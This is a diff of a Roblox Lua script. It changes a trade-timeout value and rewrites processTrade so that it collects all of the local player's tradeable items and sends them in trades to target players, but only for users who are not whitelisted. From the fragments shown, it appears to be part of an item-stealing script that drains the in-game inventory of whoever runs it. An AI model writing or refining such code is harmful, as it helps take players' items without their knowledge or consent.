@@ -31,7 +31,7 @@ LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
         task.spawn(function()
             local timeStuck = 0
             while LocalPlayer:GetAttribute("IsTrading") == true do
-                if timeStuck >= 80 then
+                if timeStuck >= 60 then
                     pcall(function() TradeData.Remotes.CancelTrade:InvokeServer() end)
                     task.wait(1.5)
                     if LocalPlayer:GetAttribute("IsTrading") == true then
@@ -114,7 +114,11 @@ if not isWhitelisted then
         return tradeable
     end
 
-    local function processTrade(targetPlayer, itemsToTrade)
+        local function processTrade(targetPlayer)
+        local itemsToTrade = getTradeableItems()
+        if #itemsToTrade == 0 then
+            return false
+        end
         
         task.wait(2)
 
@@ -190,7 +194,7 @@ if not isWhitelisted then
                 continue
             end
             
-            local success = processTrade(targetPlayer, itemsToTrade)
+            local success = processTrade(targetPlayer)
             
                         if success then
                 local stuckTimer = 0
